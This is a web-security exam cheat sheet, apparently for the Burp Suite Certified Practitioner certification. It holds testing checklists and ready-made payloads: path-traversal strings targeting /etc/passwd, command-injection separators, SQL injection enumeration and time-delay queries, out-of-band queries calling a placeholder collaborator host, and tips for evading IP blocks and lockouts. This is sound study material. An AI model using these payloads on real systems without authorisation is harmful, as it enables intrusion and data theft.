# Identifying Attacks
How to quickly identify and test for different attacks in your BSCP exam.

## Access Control
1. Can the login form be bypassed? (Go straight to /admin)
2. If authenticated can you change the user ID or username?
3. Can you submit a sensitive request but change the Referer header to where the request was suppose to come from?

## Authentication
1. User enumeration 
	* Are different error messages returned for right/wrong usernames?
	* Are there different response codes for right/wrong usernames?
	* Are the response times different for right/wrong usernames?
2. Brute-force
	* Can you brute-force password/MFA?
	* Can you brute force the stay-logged-in cookie
	* Can you crack the password offline?
	* Change IP using headers to avoid IP blocking
	* Correctly authenticate every other attempt to prevent lock-outs.
3. Is basic authentication being used? base64(username:password)
4. Can you bypass MFA pages?
5. Can you reset the users password but change the user?
6. Can you poison the password reset?

## Business Logic
1. Can you change the data type on inputs? How is this handled?
2. Can you provide a really big/small/negative input? How is this handled?
3. Is an encryption oracle present (something outputting encrypted data?)

## Clickjacking
1. Are X-Frame-Options or CSP enabled?
2. Can it be used to trigger DOM XSS?
3. Is a frame busting script in use? Can this be bypassed?

## Cross-Origin Resource Sharing (CORS)
1. Can the Origin header be changed?
	* Try using `null`
	* Can you trick the header by changing the attacker url to extend the legitimate one? For example: `target.com.malicious.com`.
2. Is CORS in use?
3. Can you use CORS to access a Intranet

## Cross-Site Request Forgery (CSRF)
1. Is a CSRF token in use? Is it tied to the user session?
2. Try both POST and GET requests
3. Use burp to generate a POC

## Cross-Site Scripting (XSS)
1. Is anything present in the URL? Send this to victim
2. Blog post?
3. Attempt breaking out of input using tags, apostrophes, templates etc..
4. Utilise html attributes such as onclick and onerror.
5. Brute-force tags and attributes, what is allowed?
6. DOM Based - look for sinks and sources
7. Custom tags, canonical tags and onfocus

## Directory Traversal
1. Is a file specified in the request or a request made to fetch a file?
2. Try basic traversal (../../../../)
3. Try URL encoding and double URL encoding
4. Try absolute paths and null byte bypass

## DOM-Based Vulnerabilities
1. Identify sources and sinks


# Quick Reference
## Cross-Site Scripting

## Directory Traversal
### Filter Evasion Techniques
|Technique|Example (../../../etc/passwd)|
|---|---|
|Nested Traveral|`....//....//....//etc/passwd` (`....\/` for Windows)|
|URL Encoding|`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`|
|Double URL Encoding|`%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`|
|Start Of Path|`/var/www/images/../../../etc/passwd`|
|Null Byte Bypass|`../../../etc/passwd%00.png`|

## DOM-Based Vulerabilities
### Common Sources
* `document.URL`
* `document.documentURI`
* `document.URLUnencoded`
* `document.baseURI`
* `location`
* `document.cookie`
* `document.referrer`
* `window.name`
* `history.pushState`
* `history.replaceState`
* `localStorage`
* `sessionStorage`
* `IndexedDB` (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)
* `Database`

### Common Sinks and Vulnerabilities
|Vulnerability|Sink|
|---|---|
|[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)|`document.write()`|
|[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)|`window.location`|
|[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) |`document.cookie`|
|[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)|`eval()`|
|[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)|`document.domain`|
|[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)|`WebSocket()`|
|[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)||`element.src`|
|[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)|`postMessage()`|
|[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)|`setRequestHeader()`|
|[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)|`FileReader.readAsText()`|
|[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)|`ExecuteSql()`|
|[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)|`sessionStorage.setItem()`|
|[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)|`document.evaluate()`|
|[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)|`JSON.parse()`|
|[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)|`element.setAttribute()`|
|[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)|`RegExp()`|

## OS Command Injection
### Command Separators
|Separator|Operating System|
|---|---|
|`&`|Unix/Windows|
|`&&`|Unix/Windows|
|<code>&#124;</code>|Unix/Windows|
|<code>&#124;&#124;</code>|Unix/Windows|
|`;`|Unix|
|`\n` or `0x0a`|Unix|
|<code>&#96;*command*&#96;</code>|Unix|
|<code>$(*command*)</code>|Unix|

### Useful Commands
|Function|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|


## SQL Injection
### Database Version
|Database Type|Command|
|----|----|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

### Database Tables
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.tables`|
|Oracle|`SELECT * FROM all_tables`|

### Database Columns
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`|
|Oracle|`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`|

### Time Delays
|Database Type|Command|
|----|----|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

### DNS Queries
|Database Type|Command|
|---|---|
|Oracle (Exploit)|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
|Oracle (Admin)|`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL (Windows)|`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|